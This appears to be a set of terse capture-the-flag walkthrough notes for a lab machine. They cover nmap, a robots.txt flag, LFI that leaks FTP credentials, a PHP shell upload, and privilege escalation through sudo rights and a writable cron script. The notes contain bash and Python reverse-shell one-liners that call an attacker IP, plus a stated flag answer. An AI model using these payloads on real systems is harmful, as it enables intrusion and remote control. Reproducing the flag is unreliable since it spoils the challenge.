start with nmap

http 80

21
80
22


http

/robots.txt --> /flag1.txt --> flag1: FLAG{robots_dot_text_what_is_next}

```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt


```
/index.php


lfi found `http://10.10.150.61/post.php?post=secret_file_do_not_read.txt`

```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 

```

ftpuser: givemefiles777

login into ftp

we can upload file in `files` folder.
upload php shell.

our files is saved in `/home/ftpuser/ftp/files/`. using lfi get reverse shell.

www-data --> toby 

www-data can run all cmds as toby (sudo)

toby --> mat 
cronjob is set up. we can modifies exec file.

bash -i >& /dev/tcp/10.11.57.82/1337 0>&1

mat --> will

`(will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *`

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.57.82",8009));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])  